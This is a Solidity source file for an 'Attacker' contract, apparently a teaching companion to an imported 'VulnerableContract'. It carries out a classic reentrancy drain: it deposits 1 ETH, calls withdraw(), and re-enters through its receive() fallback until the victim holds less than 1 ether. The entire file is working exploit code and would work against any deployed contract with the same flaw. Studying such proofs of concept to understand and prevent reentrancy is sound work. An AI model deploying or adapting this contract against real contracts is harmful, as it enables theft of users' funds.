// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import "./VulnerableContract.sol";

contract Attacker {
    VulnerableContract vulnerableContract;

    constructor(address payable _vulnerableContractAddress) {
        vulnerableContract = VulnerableContract(_vulnerableContractAddress);
    }

    receive() external payable {
        if (msg.sender == address(vulnerableContract)) {
            attack();
        }
    }

    // Step 1 : send ETH to vulnerable contract to have a balance and to be allowed to call the withdraw function
    function initialize() external payable {
        require(msg.value == 1 ether, "Please send exactly 1 ETH to initialize attack");

        (bool success,) = address(vulnerableContract).call{value: msg.value}("");

        if (!success) {
            revert("Unable to transfer value to vulnerable contract");
        }
    }

    // Step 2 : call withdraw function before
    function attack() public {
        // Stop calling withdraw function when vulnerable contract is empty
        if (address(vulnerableContract).balance < 1 ether) {
            return;
        }

        vulnerableContract.withdraw();
    }
}
